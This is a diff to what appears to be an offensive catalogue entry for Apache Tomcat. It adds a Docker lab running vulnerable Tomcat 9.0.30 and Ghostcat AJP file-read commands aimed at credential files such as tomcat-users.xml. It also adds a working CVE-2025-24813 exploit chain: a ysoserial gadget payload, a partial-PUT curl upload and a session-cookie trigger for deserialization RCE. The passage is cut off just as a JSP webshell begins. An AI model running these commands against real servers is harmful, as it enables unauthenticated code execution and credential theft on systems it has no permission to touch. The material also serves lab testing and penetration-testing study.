@@ -17,14 +17,25 @@ comment: |
   uploads as temp files with predictable names. Combined with Tomcat's FileStore session
   persistence, a malicious serialized Java object uploaded via partial PUT can be deserialized
   by requesting a session using the temp filename as the session ID.
+docker:
+  compose: "services:\n  tomcat:\n    image: tomcat:9.0.30-jdk11\n    ports:\n   \
+    \   - \"8080:8080\"\n      - \"8009:8009\"\n"
+  note: "Starts Tomcat 9.0.30 (vulnerable to CVE-2020-1938 Ghostcat) with the AJP\
+    \ connector\nexposed on port 8009. Access at `http://localhost:8080`.\nThe Ghostcat\
+    \ file-read requires no credentials \u2014 point `ajpShooter.py` at `localhost:8009`.\n\
+    To enable Manager-based WAR deployment, add credentials after the container starts:\n\
+    `docker compose exec tomcat bash -c 'echo \"<tomcat-users><user username=\\\"\
+    tomcat\\\" password=\\\"tomcat\\\" roles=\\\"manager-gui,manager-script\\\"/></tomcat-users>\"\
+    \ > conf/tomcat-users.xml'`\nThen restart the container: `docker compose restart\
+    \ tomcat`\n"
 functions:
   file-read:
   - code: |
       # Using the public Ghostcat PoC (github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi):
       python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/web.xml read
 
-      # Read arbitrary file from the webapp root:
-      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/web.xml read
+      # Read the application's compiled class configuration (may contain hardcoded credentials):
+      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/classes/application.properties read
 
       # Read files outside the webapp (path traversal via AJP attributes):
       python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/../conf/tomcat-users.xml read
@@ -63,6 +74,33 @@ functions:
     version: |-
       9.0.0.M1 - 9.0.1 / 8.5.0 - 8.5.22 / 8.0.0.RC1 - 8.0.46 / 7.0.0 - 7.0.81
   rce:
+  - blind: true
+    code: "# Step 1: generate a serialized Java payload (requires ysoserial + a gadget\
+      \ on target classpath)\n# Common gadgets: CommonsCollections2 (CC2), Spring1,\
+      \ Groovy1\njava -jar ysoserial.jar CommonsCollections2 'id > /tmp/pwned' > payload.ser\n\
+      \n# Step 2: upload via partial PUT \u2014 Tomcat stores it as a temp session\
+      \ file\nFILESIZE=$(wc -c < payload.ser | tr -d ' ')\ncurl -s -X PUT \"http://victim.com:8080/exploit.session\"\
+      \ \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -H \"Content-Range:\
+      \ bytes 0-$((FILESIZE - 1))/$((FILESIZE + 1))\" \\\n  --data-binary @payload.ser\n\
+      \n# Step 3: trigger deserialization \u2014 JSESSIONID maps to the session filename\n\
+      curl -s \"http://victim.com:8080/\" \\\n  -H \"Cookie: JSESSIONID=exploit\"\n"
+    comment: "CVE-2025-24813 (CVSS 9.8): Tomcat's partial PUT support writes uploaded\
+      \ data as a temp\nfile in the session storage directory. When FileStore-based\
+      \ session persistence is\nconfigured, a request with a JSESSIONID matching the\
+      \ temp filename causes Tomcat to\ndeserialize the file \u2014 executing any\
+      \ gadget chain embedded in the payload.\n\nPrerequisites:\n- Partial PUT enabled\
+      \ (on by default in affected versions \u2014 no config change required)\n- FileStore\
+      \ session persistence configured (non-default; check context.xml for\n    <Manager\
+      \ className=\"org.apache.catalina.session.FileStore\"/>)\n- A deserialization\
+      \ gadget chain present on the classpath (CommonsCollections,\n  Spring Framework,\
+      \ Groovy, etc.) \u2014 enumerate with github.com/frohoff/ysoserial\n\nExploitation\
+      \ is blind: write output to a file (/tmp/pwned) or use the reverse-shell\nentry\
+      \ for interactive access. Actively exploited in the wild as of Feb 2025.\n\n\
+      PoC: github.com/absholi7ly/POC-CVE-2025-24813\nnuclei: CVE-2025-24813\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      9.0.0-M1 - 9.0.98 / 10.1.0-M1 - 10.1.34 / 11.0.0-M1 - 11.0.2
   - code: |
       <%@ page import="java.io.*" %>
       <%
